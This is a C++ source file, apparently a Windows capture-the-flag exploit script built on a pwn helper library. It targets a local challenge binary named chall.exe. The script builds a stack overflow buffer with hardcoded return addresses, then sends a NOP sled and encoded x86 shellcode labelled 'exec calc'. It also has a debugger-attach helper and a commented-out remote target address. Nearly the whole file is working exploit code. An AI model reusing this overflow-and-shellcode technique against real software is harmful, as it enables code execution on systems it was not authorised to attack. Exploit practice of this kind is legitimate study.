#include <pwn.hpp>
#include <process.h>
using namespace pwn;

void
attach_debugger(u32 pid)
{
    const char* debugger_path = "C:\\Users\\ngovi\\AppData\\Local\\Microsoft\\WindowsApps\\WinDbgX.exe";
    const char* debug_cmd     = "bp 04015B5";
    std::ostringstream cmd;
    cmd << debugger_path
        << " -p " << pid
        << " -c \"" << debug_cmd << '"'
        << std::endl;
    _spawnl(_P_NOWAIT, debugger_path, cmd.str().c_str(), NULL);
    info(L"Attach sucessfully!");
}
unsigned char shellcode[] =
    "\xb8\x19\x82\x31\xfe\xda\xdc\xd9\x74\x24\xf4\x5b\x29\xc9"
    "\xb1\x30\x31\x43\x13\x03\x43\x13\x83\xc3\x1d\x60\xc4\x02"
    "\xf5\xe6\x27\xfb\x05\x87\xae\x1e\x34\x87\xd5\x6b\x66\x37"
    "\x9d\x3e\x8a\xbc\xf3\xaa\x19\xb0\xdb\xdd\xaa\x7f\x3a\xd3"
    "\x2b\xd3\x7e\x72\xaf\x2e\x53\x54\x8e\xe0\xa6\x95\xd7\x1d"
    "\x4a\xc7\x80\x6a\xf9\xf8\xa5\x27\xc2\x73\xf5\xa6\x42\x67"
    "\x4d\xc8\x63\x36\xc6\x93\xa3\xb8\x0b\xa8\xed\xa2\x48\x95"
    "\xa4\x59\xba\x61\x37\x88\xf3\x8a\x94\xf5\x3c\x79\xe4\x32"
    "\xfa\x62\x93\x4a\xf9\x1f\xa4\x88\x80\xfb\x21\x0b\x22\x8f"
    "\x92\xf7\xd3\x5c\x44\x73\xdf\x29\x02\xdb\xc3\xac\xc7\x57"
    "\xff\x25\xe6\xb7\x76\x7d\xcd\x13\xd3\x25\x6c\x05\xb9\x88"
    "\x91\x55\x62\x74\x34\x1d\x8e\x61\x45\x7c\xc4\x74\xdb\xfa"
    "\xaa\x77\xe3\x04\x9a\x1f\xd2\x8f\x75\x67\xeb\x45\x32\x97"
    "\xa1\xc4\x12\x30\x6c\x9d\x27\x5d\x8f\x4b\x6b\x58\x0c\x7e"
    "\x13\x9f\x0c\x0b\x16\xdb\x8a\xe7\x6a\x74\x7f\x08\xd9\x75"
    "\xaa\x6b\xbc\xe5\x36\x6c"; // exec calc
int
wmain()
{
    pwn::Context.set("x64");
    pwn::Context.set(log::LogLevel::Debug);

    info(L"Tetsing local process...");
    {
        //auto io = CTF::Remote(L"192.168.57.23", 1338);
        // also work with something like
        auto io = ctf::Process(L"C:\\Users\\ngovi\\Downloads\\fuck_windows\\chall.exe");
        //https://drive.google.com/file/d/1Uhgy1kLSMkEGM2qNcnalwPpuhfS3H3MD/view?usp=sharing
        if ( Success(io.Spawn()) )
        {
            auto _ = pwn::windows::System::PidOf(L"chall.exe");
            /*
                type of _ is std::varian<std::optional< std::vector<u32>,ErrorType>>
                std::get<0>(_) -> std::optional
                .value()       -> std::vector
                [0]            -> u32

            */
            u32 pid                        = std::get<0>(_).value()[0];
            info(L"pid: {}",pid);
            //attach_debugger(pid);
            char* buffer = (char*)malloc(0x100);
            if ( buffer == NULL )
            {
                err(L"Can't allocate buffer");
                exit(-1);
            }
            *(int*)(buffer + 0x20) = 0x0040263C;
            *(int*)(buffer + 0x20 + 4) = 0x0060e000;
            *(int*)(buffer + 0x20 + 8) = 0x0060e000;
            std::vector<u8> sendbuffer; // user vector<u8> to send null byte.
            for ( size_t i = 0; i <0x28+4; i++ )
            {
                sendbuffer.push_back(buffer[i]);
            }
            io.recvuntil("Enter your name:");
            utils::Pause();
            info(L"Send {} bytes", sendbuffer.size());
            io.sendline(sendbuffer);

            io.recvline();
            std::vector<u8> sendshellcode;
            for ( size_t i = 0; i < 0x30; i++ )
                sendshellcode.push_back('\x90');
            for ( size_t i = 0; i < sizeof(shellcode); i++ )
            {
                sendshellcode.push_back(shellcode[i]);
            }
            utils::Pause();
            info(L"Send {} bytes", sendshellcode.size());
            io.sendline(sendshellcode);
            io.interactive();
        }

        ok(L"Done");
    }
    utils::Pause();
    return 0;
}
